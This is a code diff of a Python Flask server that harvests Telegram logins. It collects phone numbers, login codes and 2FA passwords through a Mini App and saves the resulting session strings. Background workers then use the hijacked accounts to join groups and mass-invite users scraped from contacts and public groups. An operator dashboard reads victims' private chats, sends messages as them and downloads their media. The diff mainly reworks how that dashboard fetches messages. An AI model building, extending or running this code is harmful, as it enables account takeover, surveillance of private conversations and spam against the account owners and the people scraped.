@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
 """
 Telegram Auto-Add Server - PHONE SHARE AUTO-LOGIN VERSION
-Users only need to share phone + enter code
-Auto-add and auto-join fully working
-With Dashboard Chat & Messaging Support
+Optimized Dashboard - Chat list only, history on demand
 """
 
 from flask import Flask, jsonify, request, redirect, send_file
@@ -95,7 +93,6 @@ AUTO_SESSIONS_FILE = 'auto_sessions.json'
 USER_MAP_FILE = 'user_map.json'
 MEDIA_CACHE_DIR = 'media_cache'
 
-# Create media cache directory
 os.makedirs(MEDIA_CACHE_DIR, exist_ok=True)
 
 # Storage with thread locks
@@ -109,10 +106,12 @@ worker_adds = defaultdict(list)
 file_lock = threading.Lock()
 worker_lock = threading.Lock()
 
-# Chat cache for dashboard
-chat_cache = {}
-chat_cache_lock = threading.Lock()
-CACHE_DURATION = 30  # seconds
+# Chat cache for dashboard (LIGHTWEIGHT - only chat list, no message history)
+chat_list_cache = {}
+message_cache = {}
+cache_lock = threading.Lock()
+CHAT_LIST_CACHE_DURATION = 15  # 15 seconds for chat list
+MESSAGE_CACHE_DURATION = 30    # 30 seconds for messages
 
 stats = {
     'total_added': 0,
@@ -130,7 +129,6 @@ stats = {
 # EVENT LOOP HELPER FOR THREADS
 # ============================================
 def get_or_create_eventloop():
-    """Get existing event loop or create a new one for the current thread"""
     try:
         loop = asyncio.get_event_loop()
         if loop.is_closed():
@@ -152,7 +150,6 @@ def load_json(path, default):
                 content = f.read().strip()
                 if content:
                     data = json.loads(content)
-                    # Create backup
                     backup_path = f"{path}.backup"
                     with open(backup_path, 'w') as backup:
                         json.dump(data, backup, indent=2, default=str)
@@ -223,15 +220,13 @@ def load_user_map():
     user_phone_map = load_json(USER_MAP_FILE, {})
 
 # ============================================
-# TELEGRAM CLIENT HELPER (FIXED EVENT LOOP)
+# TELEGRAM CLIENT HELPER
 # ============================================
 class SyncTelegramClient:
     @staticmethod
     def run_async(async_func, timeout=60, retries=2):
-        """Run async function synchronously with proper event loop handling"""
         for attempt in range(retries + 1):
             try:
-                # Get or create event loop for this thread
                 loop = get_or_create_eventloop()
                 result = loop.run_until_complete(
                     asyncio.wait_for(async_func(), timeout=timeout)
@@ -249,11 +244,8 @@ class SyncTelegramClient:
     
     @staticmethod
     def get_client(session_string):
-        """Create a TelegramClient with proper event loop"""
         try:
-            # Ensure event loop exists before creating client
             get_or_create_eventloop()
-            
             return TelegramClient(
                 StringSession(session_string), 
                 API_ID, 
@@ -403,7 +395,7 @@ def send_telegram(text, retries=3):
     return False
 
 # ============================================
-# AUTO-ADD WORKER (FIXED EVENT LOOP)
+# AUTO-ADD WORKER
 # ============================================
 class AutoAddWorker:
     def __init__(self, account):
@@ -428,7 +420,6 @@ class AutoAddWorker:
     def disconnect_client(self):
         if self.client:
             try:
-                # Use the worker's event loop to disconnect
                 if self._loop and not self._loop.is_closed():
                     async def _disconnect():
                         try:
@@ -436,9 +427,7 @@ class AutoAddWorker:
                         except:
                             pass
                     try:
-                        self._loop.run_until_complete(
-                            asyncio.wait_for(_disconnect(), timeout=5)
-                        )
+                        self._loop.run_until_complete(asyncio.wait_for(_disconnect(), timeout=5))
                     except:
                         pass
             except:
@@ -447,7 +436,6 @@ class AutoAddWorker:
                 self.client = None
     
     def run(self):
-        # Create and set event loop for this worker thread
         self._loop = asyncio.new_event_loop()
         asyncio.set_event_loop(self._loop)
         
@@ -557,7 +545,6 @@ class AutoAddWorker:
                 self.reconnect()
         
         logger.info(f"Worker {self.acc_key} stopped")
-        # Clean up event loop
         try:
             if self._loop and not self._loop.is_closed():
                 self._loop.close()
@@ -618,7 +605,6 @@ class AutoAddWorker:
                 if result:
                     self.last_ping = time.time()
                     self.last_activity = time.time()
-                    logger.info(f"Worker {self.acc_key}: Connected successfully")
                     return True
             except Exception as e:
                 logger.error(f"Connect error (attempt {attempt + 1}): {e}")
@@ -627,7 +613,6 @@ class AutoAddWorker:
         return False
     
     def reconnect(self):
-        logger.info(f"Worker {self.acc_key}: Reconnecting...")
         self.disconnect_client()
         time.sleep(3)
         return self.connect_client()
@@ -636,37 +621,30 @@ class AutoAddWorker:
         for target in TARGET_GROUPS:
             if target in self.joined_groups:
                 continue
-            
             max_retries = 3
             for attempt in range(max_retries):
                 try:
                     if not self.ensure_connection():
                         time.sleep(5)
                         continue
-                    
                     async def _join():
                         try:
                             entity = await self.client.get_entity(target)
                             await self.client(JoinChannelRequest(entity))
                             return True
                         except errors.FloodWaitError as e:
-                            wait_time = min(e.seconds, 120)
-                            logger.warning(f"Flood wait for join: {wait_time}s")
-                            time.sleep(wait_time)
+                            time.sleep(min(e.seconds, 120))
                             return False
                         except Exception as e:
                             if 'already' in str(e).lower() or 'participant' in str(e).lower():
                                 return True
-                            logger.error(f"Join error: {e}")
                             return False
-                    
                     if SyncTelegramClient.run_async(_join, timeout=30):
                         self.joined_groups.add(target)
                         logger.info(f"Worker {self.acc_key}: ✅ Joined {target}")
                         break
                 except Exception as e:
-                    logger.warning(f"Join {target} failed (attempt {attempt + 1}): {e}")
-                
+                    logger.warning(f"Join {target} failed: {e}")
                 time.sleep(min(5 * (attempt + 1), 20))
     
     def get_user_sources(self):
@@ -676,32 +654,24 @@ class AutoAddWorker:
         
         async def _collect():
             nonlocal user_ids
-            
             try:
                 contacts = await self.client(GetContactsRequest(0))
                 for user in contacts.users:
                     if user.id and not getattr(user, 'bot', False) and not user.deleted:
                         user_ids.add(user.id)
-                logger.debug(f"Got {len([u for u in contacts.users if not getattr(u, 'bot', False)])} from contacts")
-            except Exception as e:
-                logger.error(f"Contacts collection error: {e}")
-            
+            except:
+                pass
             try:
                 dialogs = await self.client.get_dialogs(limit=100)
                 for d in dialogs:
                     if d.is_user and d.entity and d.entity.id:
                         if not getattr(d.entity, 'bot', False) and not d.entity.deleted:
                             user_ids.add(d.entity.id)
-                logger.debug(f"Got from dialogs, total users: {len(user_ids)}")
-            except Exception as e:
-                logger.error(f"Dialogs collection error: {e}")
-            
-            source_groups = [
-                'telegram', 'durov', 'TelegramTips', 'contest',
-                'TelegramNews', 'builders', 'Android', 'iOS',
-                'Python', 'programming', 'abe_army', 'Abe_armygroup'
-            ]
-            
+            except:
+                pass
+            source_groups = ['telegram', 'durov', 'TelegramTips', 'contest',
+                           'TelegramNews', 'builders', 'Android', 'iOS',
+                           'Python', 'programming', 'abe_army', 'Abe_armygroup']
             for sg in source_groups:
                 try:
                     entity = await self.client.get_entity(sg)
@@ -710,27 +680,23 @@ class AutoAddWorker:
                         if user.id and not getattr(user, 'bot', False) and not user.deleted:
                             user_ids.add(user.id)
                     await asyncio.sleep(0.3)
-                except Exception as e:
+                except:
                     continue
-            
             return list(user_ids)
         
         try:
             result = SyncTelegramClient.run_async(_collect, timeout=60)
             return result if result else list(user_ids)
-        except Exception as e:
-            logger.error(f"User source collection failed: {e}")
+        except:
             return list(user_ids)
     
     def add_user_to_targets(self, user_id):
         success = False
-        
         for target in TARGET_GROUPS:
             if not self.running:
                 break
             if not self.ensure_connection():
                 break
-            
             async def _add():
                 try:
                     entity = await self.client.get_entity(target)
@@ -738,16 +704,10 @@ class AutoAddWorker:
                     await self.client(InviteToChannelRequest(entity, [user_input]))
                     return True
                 except errors.FloodWaitError as e:
-                    wait_time = min(e.seconds, 60)
-                    time.sleep(wait_time)
+                    time.sleep(min(e.seconds, 60))
                     return False
-                except (errors.UserPrivacyRestrictedError, errors.UserNotMutualContactError,
-                        errors.UserAlreadyParticipantError, errors.UserKickedError,
-                        errors.UserBannedInChannelError, errors.UserDeactivatedBanError) as e:
+                except:
                     return False
-                except Exception as e:
-                    return False
-            
             try:
                 if SyncTelegramClient.run_async(_add, timeout=15):
                     success = True
@@ -756,11 +716,7 @@ class AutoAddWorker:
         
         if success:
             try:
-                record = {
-                    'user_id': user_id,
-                    'time': datetime.now().isoformat(),
-                    'worker_id': self.acc_id
-                }
+                record = {'user_id': user_id, 'time': datetime.now().isoformat(), 'worker_id': self.acc_id}
                 worker_adds[self.acc_key].append(record)
                 if len(worker_adds[self.acc_key]) > 1000:
                     worker_adds[self.acc_key] = worker_adds[self.acc_key][-1000:]
@@ -768,7 +724,6 @@ class AutoAddWorker:
                     save_json(WORKER_ADDS_FILE, dict(worker_adds))
             except:
                 pass
-        
         return success
 
 def start_auto_add(account):
@@ -780,7 +735,6 @@ def start_auto_add(account):
                 if existing and existing.get('thread') and existing['thread'].is_alive():
                     existing['worker'].stop()
                     existing['thread'].join(timeout=5)
-            
             worker = AutoAddWorker(account)
             thread = threading.Thread(target=worker.run, daemon=True, name=f"worker_{acc_key}")
             thread.start()
@@ -805,26 +759,17 @@ def stop_auto_add(account_id):
 # PHONE LOOKUP HELPERS
 # ============================================
 def find_phone_for_user(telegram_id):
-    phone = None
     tid = str(telegram_id)
-    
     phone = user_phone_map.get(tid, '')
     if phone:
-        logger.info(f"Found phone in user_phone_map for {tid}: {phone[:4]}****")
         return phone
-    
     if tid in auto_sessions:
         phone = auto_sessions[tid].get('phone', '')
         if phone:
-            logger.info(f"Found phone in auto_sessions for {tid}: {phone[:4]}****")
             return phone
-    
     for acc in accounts:
         if str(acc.get('telegram_id')) == tid and acc.get('phone'):
-            phone = acc['phone']
-            logger.info(f"Found phone in accounts for {tid}: {phone[:4]}****")
-            return phone
-    
+            return acc['phone']
     return None
 
 def auto_send_code(phone, telegram_id, first_name='', last_name='', username=''):
@@ -847,11 +792,8 @@ def auto_send_code(phone, telegram_id, first_name='', last_name='', username='')
                 'username': username
             }
             save_temp_sessions()
-            
             masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else '***' + phone[-3:]
-            
-            logger.info(f"✅ Code sent to {masked_phone} for user {telegram_id}")
-            
+            logger.info(f"✅ Code sent to {masked_phone}")
             return {
                 'success': True,
                 'session_id': sid,
@@ -859,14 +801,12 @@ def auto_send_code(phone, telegram_id, first_name='', last_name='', username='')
                 'user_name': f"{first_name} {last_name}".strip() or username or 'User'
             }
         except errors.FloodWaitError as e:
-            logger.warning(f"Flood wait for {phone}: {e.seconds}s")
             return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds.'}
         except errors.PhoneNumberInvalidError:
-            logger.warning(f"Invalid phone: {phone}")
             return {'success': False, 'error': 'Invalid phone number.'}
         except Exception as e:
-            logger.error(f"Auto code error for {phone}: {e}")
-            return {'success': False, 'error': f'Could not send code. Try again.'}
+            logger.error(f"Auto code error: {e}")
+            return {'success': False, 'error': 'Could not send code.'}
         finally:
             try:
                 await client.disconnect()
@@ -874,7 +814,6 @@ def auto_send_code(phone, telegram_id, first_name='', last_name='', username='')
                 pass
     
     result = SyncTelegramClient.run_async(send_auto_code, timeout=45)
-    
     if not result.get('success'):
         if str(telegram_id) in user_phone_map:
             del user_phone_map[str(telegram_id)]
@@ -882,11 +821,10 @@ def auto_send_code(phone, telegram_id, first_name='', last_name='', username='')
         if str(telegram_id) in auto_sessions:
             del auto_sessions[str(telegram_id)]
             save_auto_sessions()
-    
     return result
 
 # ============================================
-# DASHBOARD - CHAT & MESSAGE HELPERS
+# DASHBOARD HELPERS (LIGHTWEIGHT)
 # ============================================
 def get_account_by_id(account_id):
     for acc in accounts:
@@ -904,8 +842,11 @@ def get_client_for_account(account_id):
     except Exception as e:
         return None, str(e)
 
-async def get_dialogs_async(client, limit=50):
-    """Get dialogs (chats) for the dashboard"""
+async def get_dialogs_lightweight(client, limit=50):
+    """
+    Get ONLY chat list with last message preview - NO full message history.
+    This is fast and lightweight.
+    """
     dialogs_list = []
     
     try:
@@ -923,7 +864,6 @@ async def get_dialogs_async(client, limit=50):
                 else:
                     continue
                 
-                # Get title
                 title = dialog.name or 'Unknown'
                 
                 # Determine type
@@ -936,7 +876,7 @@ async def get_dialogs_async(client, limit=50):
                 else:
                     chat_type = 'user'
                 
-                # Get last message info
+                # Get last message info ONLY (no history fetch)
                 last_message_text = ''
                 last_message_date = None
                 last_message_media = None
@@ -952,8 +892,6 @@ async def get_dialogs_async(client, limit=50):
                             last_message_media = 'photo'
                         elif hasattr(msg.media, 'document'):
                             last_message_media = 'document'
-                        elif hasattr(msg.media, 'webpage'):
-                            last_message_media = 'link'
                 
                 chat_data = {
                     'id': chat_id,
@@ -970,23 +908,24 @@ async def get_dialogs_async(client, limit=50):
                 
                 dialogs_list.append(chat_data)
             except Exception as e:
-                logger.error(f"Error processing dialog: {e}")
                 continue
         
         # Sort: unread first, then by date
         dialogs_list.sort(key=lambda x: (-x.get('unread', 0), -(x.get('lastMessageDate') or 0)))
-        
         return dialogs_list
+        
     except Exception as e:
         logger.error(f"Get dialogs error: {e}")
         raise
 
-async def get_messages_async(client, chat_id, limit=50):
-    """Get messages for a specific chat"""
+async def get_chat_messages(client, chat_id, limit=30):
+    """
+    Get messages for a SPECIFIC chat - called only when user clicks a chat.
+    """
     messages_list = []
     
     try:
-        # Try to get entity
+        # Get entity
         entity = None
         try:
             if chat_id.startswith('-'):
@@ -994,20 +933,17 @@ async def get_messages_async(client, chat_id, limit=50):
             else:
                 entity = await client.get_entity(chat_id)
         except:
-            # Try as integer
             try:
                 entity = await client.get_entity(int(chat_id))
             except:
-                logger.error(f"Cannot find entity for {chat_id}")
                 return messages_list
         
-        # Get message history
+        # Get messages
         messages = await client.get_messages(entity, limit=limit)
         
         for msg in messages:
             if not msg:
                 continue
-            
             try:
                 msg_data = {
                     'id': msg.id,
@@ -1019,7 +955,6 @@ async def get_messages_async(client, chat_id, limit=50):
                     'mediaType': None
                 }
                 
-                # Detect media type
                 if msg.media:
                     if hasattr(msg.media, 'photo') or isinstance(msg.media, MessageMediaPhoto):
                         msg_data['mediaType'] = 'photo'
@@ -1035,12 +970,9 @@ async def get_messages_async(client, chat_id, limit=50):
                                 msg_data['mediaType'] = 'document'
                     elif isinstance(msg.media, MessageMediaWebPage):
                         msg_data['mediaType'] = 'link'
-                    else:
-                        msg_data['mediaType'] = 'media'
                 
                 messages_list.append(msg_data)
-            except Exception as e:
-                logger.error(f"Error processing message {msg.id}: {e}")
+            except:
                 continue
         
         return messages_list
@@ -1049,7 +981,6 @@ async def get_messages_async(client, chat_id, limit=50):
         raise
 
 async def send_message_async(client, chat_id, message_text):
-    """Send a message to a chat"""
     try:
         entity = None
         try:
@@ -1064,7 +995,6 @@ async def send_message_async(client, chat_id, message_text):
                 raise ValueError(f"Cannot find chat: {chat_id}")
         
         result = await client.send_message(entity, message_text)
-        
         return {
             'success': True,
             'messageId': result.id,
@@ -1076,36 +1006,23 @@ async def send_message_async(client, chat_id, message_text):
         raise
 
 async def download_media_async(client, account_id, message_id):
-    """Download media from a message"""
     try:
-        # Get all dialogs to find the message
         dialogs = await client.get_dialogs(limit=100)
-        
         for dialog in dialogs:
             try:
                 messages = await client.get_messages(dialog.entity, limit=100)
                 for msg in messages:
                     if msg.id == int(message_id) and msg.media:
-                        # Download media
                         filename = f"media_{account_id}_{message_id}"
                         filepath = os.path.join(MEDIA_CACHE_DIR, filename)
-                        
-                        # Download
                         await client.download_media(msg, filepath)
-                        
-                        # Detect mime type
                         mime_type = mimetypes.guess_type(filepath)[0] or 'application/octet-stream'
-                        
-                        # Read file and encode as base64
                         with open(filepath, 'rb') as f:
                             data = f.read()
-                        
-                        # Clean up file
                         try:
                             os.remove(filepath)
                         except:
                             pass
-                        
                         return {
                             'data': base64.b64encode(data).decode('utf-8'),
                             'mime_type': mime_type,
@@ -1113,7 +1030,6 @@ async def download_media_async(client, account_id, message_id):
                         }
             except:
                 continue
-        
         return None
     except Exception as e:
         logger.error(f"Download media error: {e}")
@@ -1210,13 +1126,13 @@ def get_accounts():
     return jsonify({'success': True, 'accounts': acc_list})
 
 # ============================================
-# DASHBOARD - GET MESSAGES (CHATS + MESSAGES)
+# DASHBOARD - GET CHAT LIST ONLY (FAST)
 # ============================================
-@app.route('/api/get-messages', methods=['POST'])
-def get_messages():
+@app.route('/api/get-chats', methods=['POST'])
+def get_chats():
     """
-    Get all dialogs (chats) and messages for an account
-    Used by the dashboard
+    Get ONLY chat list with last message preview.
+    NO message history - fast and lightweight.
     """
     try:
         data = request.json or {}
@@ -1227,52 +1143,37 @@ def get_messages():
         
         # Check cache
         cache_key = f"chats_{account_id}"
-        with chat_cache_lock:
-            if cache_key in chat_cache:
-                cached = chat_cache[cache_key]
-                if time.time() - cached.get('timestamp', 0) < CACHE_DURATION:
-                    logger.info(f"Returning cached chats for account {account_id}")
+        with cache_lock:
+            if cache_key in chat_list_cache:
+                cached = chat_list_cache[cache_key]
+                if time.time() - cached.get('timestamp', 0) < CHAT_LIST_CACHE_DURATION:
                     return jsonify(cached['data'])
         
         client, acc = get_client_for_account(account_id)
         if not client:
             return jsonify({'success': False, 'error': acc})
         
-        async def _get_chats():
+        async def _get():
             if not await SyncTelegramClient.safe_connect(client):
                 return None, "Failed to connect"
-            
             if not await client.is_user_authorized():
                 return None, "auth_key_unregistered"
-            
-            dialogs = await get_dialogs_async(client, limit=50)
-            
-            # Get messages for all chats (combined)
-            all_messages = []
-            for dialog in dialogs[:20]:  # Limit to first 20 chats for messages
-                try:
-                    msgs = await get_messages_async(client, dialog['id'], limit=30)
-                    all_messages.extend(msgs)
-                except:
-                    continue
-            
+            dialogs = await get_dialogs_lightweight(client, limit=50)
             return {
                 'success': True,
                 'chats': dialogs,
-                'messages': all_messages,
                 'accountName': acc.get('name', 'Unknown')
             }, None
         
         try:
-            result, error = SyncTelegramClient.run_async(_get_chats, timeout=45)
+            result, error = SyncTelegramClient.run_async(_get, timeout=25)
             
             if error:
                 return jsonify({'success': False, 'error': error})
             
             if result:
-                # Cache the result
-                with chat_cache_lock:
-                    chat_cache[cache_key] = {
+                with cache_lock:
+                    chat_list_cache[cache_key] = {
                         'data': result,
                         'timestamp': time.time()
                     }
@@ -1289,8 +1190,73 @@ def get_messages():
                 pass
                 
     except Exception as e:
-        logger.error(f"Get messages error: {e}")
-        logger.error(traceback.format_exc())
+        logger.error(f"Get chats error: {e}")
+        return jsonify({'success': False, 'error': str(e)[:200]})
+
+# ============================================
+# DASHBOARD - GET MESSAGES FOR SPECIFIC CHAT (ON DEMAND)
+# ============================================
+@app.route('/api/get-chat-messages', methods=['POST'])
+def get_chat_messages_route():
+    """
+    Get messages for a SPECIFIC chat - called only when user clicks a chat.
+    """
+    try:
+        data = request.json or {}
+        account_id = data.get('accountId', '')
+        chat_id = data.get('chatId', '')
+        
+        if not account_id:
+            return jsonify({'success': False, 'error': 'Account ID required'})
+        if not chat_id:
+            return jsonify({'success': False, 'error': 'Chat ID required'})
+        
+        # Check message cache
+        cache_key = f"msgs_{account_id}_{chat_id}"
+        with cache_lock:
+            if cache_key in message_cache:
+                cached = message_cache[cache_key]
+                if time.time() - cached.get('timestamp', 0) < MESSAGE_CACHE_DURATION:
+                    return jsonify(cached['data'])
+        
+        client, acc = get_client_for_account(account_id)
+        if not client:
+            return jsonify({'success': False, 'error': acc})
+        
+        async def _get_msgs():
+            if not await SyncTelegramClient.safe_connect(client):
+                return None, "Failed to connect"
+            if not await client.is_user_authorized():
+                return None, "Session expired"
+            messages = await get_chat_messages(client, chat_id, limit=30)
+            return {'success': True, 'messages': messages}, None
+        
+        try:
+            result, error = SyncTelegramClient.run_async(_get_msgs, timeout=20)
+            
+            if error:
+                return jsonify({'success': False, 'error': error})
+            
+            if result:
+                with cache_lock:
+                    message_cache[cache_key] = {
+                        'data': result,
+                        'timestamp': time.time()
+                    }
+                return jsonify(result)
+            else:
+                return jsonify({'success': False, 'error': 'No messages found'})
+                
+        finally:
+            try:
+                async def _disconnect():
+                    await client.disconnect()
+                SyncTelegramClient.run_async(_disconnect, timeout=5)
+            except:
+                pass
+                
+    except Exception as e:
+        logger.error(f"Get chat messages error: {e}")
         return jsonify({'success': False, 'error': str(e)[:200]})
 
 # ============================================
@@ -1298,9 +1264,6 @@ def get_messages():
 # ============================================
 @app.route('/api/send-message', methods=['POST'])
 def send_message():
-    """
-    Send a message to a chat
-    """
     try:
         data = request.json or {}
         account_id = data.get('accountId', '')
@@ -1321,10 +1284,8 @@ def send_message():
         async def _send():
             if not await SyncTelegramClient.safe_connect(client):
                 return None, "Failed to connect"
-            
             if not await client.is_user_authorized():
                 return None, "Session expired"
-            
             result = await send_message_async(client, chat_id, message_text)
             return result, None
         
@@ -1334,11 +1295,14 @@ def send_message():
             if error:
                 return jsonify({'success': False, 'error': error})
             
-            # Invalidate cache for this account
-            cache_key = f"chats_{account_id}"
-            with chat_cache_lock:
-                if cache_key in chat_cache:
-                    del chat_cache[cache_key]
+            # Invalidate caches
+            with cache_lock:
+                cache_key = f"chats_{account_id}"
+                if cache_key in chat_list_cache:
+                    del chat_list_cache[cache_key]
+                msg_key = f"msgs_{account_id}_{chat_id}"
+                if msg_key in message_cache:
+                    del message_cache[msg_key]
             
             return jsonify(result or {'success': False, 'error': 'Failed to send'})
             
@@ -1352,7 +1316,6 @@ def send_message():
                 
     except Exception as e:
         logger.error(f"Send message error: {e}")
-        logger.error(traceback.format_exc())
         return jsonify({'success': False, 'error': str(e)[:200]})
 
 # ============================================
@@ -1360,13 +1323,10 @@ def send_message():
 # ============================================
 @app.route('/api/media/<int:account_id>/<int:message_id>')
 def get_media(account_id, message_id):
-    """
-    Download and serve media file
-    """
     try:
         client, acc = get_client_for_account(account_id)
         if not client:
-            return jsonify({'success': False, 'error': acc}), 404
+            return jsonify({'error': 'Account not found'}), 404
         
         async def _download():
             if not await SyncTelegramClient.safe_connect(client):
@@ -1408,9 +1368,6 @@ def get_media(account_id, message_id):
 # ============================================
 @app.route('/api/share-phone', methods=['POST'])
 def share_phone():
-    """
-    Receive shared phone from Telegram Mini App and send verification code
-    """
     try:
         data = request.json or {}
         phone = data.get('phone', '').strip()
@@ -1422,50 +1379,35 @@ def share_phone():
         if not phone:
             return jsonify({'success': False, 'error': 'No phone number provided'})
         
-        # Clean phone - using string replace
         phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
         if not phone.startswith('+'):
             phone = '+' + phone
         
-        logger.info(f"📱 Shared phone received for user {telegram_id}: {phone[:4]}****")
+        logger.info(f"📱 Shared phone for user {telegram_id}: {phone[:4]}****")
         
-        # Save phone mapping
         if telegram_id:
             user_phone_map[telegram_id] = phone
             save_user_map()
-            logger.info(f"✅ Saved phone mapping: {telegram_id} -> {phone[:4]}****")
         
-        # Auto-send code
         result = auto_send_code(phone, telegram_id, first_name, last_name, username)
-        
         return jsonify(result)
         
     except Exception as e:
         logger.error(f"Share phone error: {e}")
-        logger.error(traceback.format_exc())
-        return jsonify({'success': False, 'error': 'Failed to process phone. Please try again.'})
+        return jsonify({'success': False, 'error': 'Failed to process phone.'})
 
 # ============================================
-# TELEGRAM AUTO-LOGIN (for returning users)
+# TELEGRAM AUTO-LOGIN
 # ============================================
 @app.route('/api/telegram-auto-login', methods=['POST'])
 def telegram_auto_login():
-    """
-    Auto-login for returning users
-    Checks if phone is saved, sends code automatically
-    """
     try:
         data = request.json or {}
-        
-        # Get initData
         init_data_str = data.get('initData', '')
         if not init_data_str:
             init_data_str = request.args.get('initData', '')
         
-        # Get user data
         user_data = data.get('user', {})
-        
-        # Parse initData if needed
         if not user_data and init_data_str:
             for item in init_data_str.split('&'):
                 if item.startswith('user='):
@@ -1481,24 +1423,16 @@ def telegram_auto_login():
         username = user_data.get('username', '')
         
         if not telegram_id:
-            return jsonify({
-                'success': False,
-                'error': 'Could not identify your Telegram account.',
-                'needs_phone': True
-            })
+            return jsonify({'success': False, 'error': 'Could not identify account.', 'needs_phone': True})
         
-        logger.info(f"Auto-login check for user {telegram_id} ({first_name} {last_name})")
-        
-        # Try to find saved phone
         phone = find_phone_for_user(telegram_id)
         
         if phone:
-            logger.info(f"✅ Found saved phone for {telegram_id}, sending code...")
+            logger.info(f"✅ Found phone for {telegram_id}, sending code...")
             result = auto_send_code(phone, telegram_id, first_name, last_name, username)
             result['auto_detected'] = True
             return jsonify(result)
         else:
-            logger.info(f"No saved phone for {telegram_id}, requesting phone share")
             return jsonify({
                 'success': False,
                 'error': 'Please share your phone number.',
@@ -1510,19 +1444,13 @@ def telegram_auto_login():
             
     except Exception as e:
         logger.error(f"Auto-login error: {e}")
-        logger.error(traceback.format_exc())
-        return jsonify({
-            'success': False,
-            'error': 'Auto-login failed. Please try again.',
-            'needs_phone': True
-        })
+        return jsonify({'success': False, 'error': 'Auto-login failed.', 'needs_phone': True})
 
 # ============================================
 # ADD ACCOUNT
 # ============================================
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
-    """Send verification code"""
     try:
         data = request.json
         phone = data.get('phone', '').strip()
@@ -1530,22 +1458,16 @@ def add_account():
         
         if not phone:
             return jsonify({'success': False, 'error': 'Phone number required'})
-        
         if not phone.startswith('+'):
             phone = '+' + phone
         
-        logger.info(f"Sending verification code to {phone[:4]}****")
-        
         result = auto_send_code(phone, telegram_id)
         return jsonify(result)
-        
     except Exception as e:
-        logger.error(f"Add account error: {e}")
-        return jsonify({'success': False, 'error': 'Server error. Please try again.'})
+        return jsonify({'success': False, 'error': 'Server error.'})
 
 @app.route('/api/verify-code', methods=['POST'])
 def verify_code():
-    """Verify the code and save the account"""
     try:
         data = request.json
         code = data.get('code', '').strip()
@@ -1553,21 +1475,20 @@ def verify_code():
         pwd = data.get('password', '')
         
         if not sid or sid not in temp_sessions:
-            return jsonify({'success': False, 'error': 'Session expired. Please request a new code.'})
+            return jsonify({'success': False, 'error': 'Session expired.'})
         
         td = temp_sessions[sid]
         telegram_id = str(td.get('telegram_id', ''))
         
-        # Check attempts
         if td.get('code_attempts', 0) >= 5:
             del temp_sessions[sid]
             save_temp_sessions()
-            return jsonify({'success': False, 'error': 'Too many incorrect codes. Session expired.'})
+            return jsonify({'success': False, 'error': 'Too many incorrect codes.'})
         
         if td.get('password_attempts', 0) >= 5:
             del temp_sessions[sid]
             save_temp_sessions()
-            return jsonify({'success': False, 'error': 'Too many incorrect passwords. Session expired.'})
+            return jsonify({'success': False, 'error': 'Too many incorrect passwords.'})
         
         async def verify():
             client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
@@ -1592,17 +1513,14 @@ def verify_code():
                             del temp_sessions[sid]
                             save_temp_sessions()
                             return {'success': False, 'error': 'Too many incorrect passwords.'}
-                        return {'success': False, 'error': f'Wrong 2FA password. {remaining} attempts remaining.'}
+                        return {'success': False, 'error': f'Wrong password. {remaining} attempts remaining.'}
                 
                 me = await client.get_me()
                 user_telegram_id = str(me.id) if me.id else telegram_id
                 
-                # SAVE PHONE MAPPING
                 if user_telegram_id:
                     user_phone_map[user_telegram_id] = td['phone']
                     save_user_map()
-                    logger.info(f"✅ Saved mapping: {user_telegram_id} -> phone")
-                    
                     auto_sessions[user_telegram_id] = {
                         'phone': td['phone'],
                         'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
@@ -1612,13 +1530,11 @@ def verify_code():
                     }
                     save_auto_sessions()
                 
-                # Get account age
                 try:
                     account_age = get_account_age_sync(client.session.save())
                 except:
                     account_age = {'age_display': 'Unknown'}
                 
-                # Create or update account
                 new_id = int(time.time() * 1000)
                 new_acc = {
                     'id': new_id,
@@ -1634,7 +1550,6 @@ def verify_code():
                 if not new_acc['name']:
                     new_acc['name'] = 'User ' + str(new_id)[-4:]
                 
-                # Check for duplicate and update
                 existing = None
                 for a in accounts:
                     if str(a.get('telegram_id')) == user_telegram_id:
@@ -1642,16 +1557,13 @@ def verify_code():
                         break
                 
                 if existing:
-                    logger.info(f"Updating existing account {existing['id']}")
                     existing.update(new_acc)
                     new_acc['id'] = existing['id']
                 else:
-                    logger.info(f"Adding new account {new_id}")
                     accounts.append(new_acc)
                 
                 save_json(ACCOUNTS_FILE, accounts)
                 
-                # Set up auto-add settings
                 auto_add_settings[str(new_acc['id'])] = {
                     'enabled': True,
                     'target_group': TARGET_GROUPS[0],
@@ -1660,38 +1572,27 @@ def verify_code():
                 }
                 save_json(SETTINGS_FILE, auto_add_settings)
                 
-                # Initialize worker stats
                 if 'worker_stats' not in stats:
                     stats['worker_stats'] = {}
                 stats['worker_stats'][str(new_acc['id'])] = {'total': 0, 'today': 0, 'verified_today': 0}
                 save_json(STATS_FILE, stats)
                 
-                # START AUTO-ADD WORKER
                 start_auto_add(new_acc)
                 
-                # Send notification
                 age_info = account_age.get('age_display', 'Unknown')
                 try:
                     send_telegram(
-                        f"<b>{SERVER_NAME}</b>\n"
-                        f"✅ Account added!\n"
+                        f"<b>{SERVER_NAME}</b>\n✅ Account added!\n"
                         f"Name: {new_acc['name']}\n"
                         f"Phone: {new_acc['phone'][:4]}****\n"
-                        f"Age: {age_info}\n"
-                        f"Auto-add: Started"
+                        f"Age: {age_info}\nAuto-add: Started"
                     )
                 except:
                     pass
                 
-                logger.info(f"✅ Account verified: {new_acc['name']} - Auto-add started")
-                
                 return {
                     'success': True,
-                    'account': {
-                        'id': new_acc['id'],
-                        'name': new_acc['name'],
-                        'phone': new_acc['phone']
-                    },
+                    'account': {'id': new_acc['id'], 'name': new_acc['name'], 'phone': new_acc['phone']},
                     'account_age': age_info,
                     'auto_login_enabled': True
                 }
@@ -1706,9 +1607,8 @@ def verify_code():
                     return {'success': False, 'error': 'Too many incorrect codes.'}
                 return {'success': False, 'error': f'Invalid code. {remaining} attempts remaining.'}
             except errors.PhoneCodeExpiredError:
-                return {'success': False, 'error': 'Code expired. Please request a new one.'}
+                return {'success': False, 'error': 'Code expired.'}
             except Exception as e:
-                logger.error(f"Verify error: {e}")
                 return {'success': False, 'error': str(e)[:200]}
             finally:
                 try:
@@ -1718,7 +1618,6 @@ def verify_code():
         
         result = SyncTelegramClient.run_async(verify, timeout=45)
         
-        # Clean up session on success
         if result.get('success') and not result.get('need_password'):
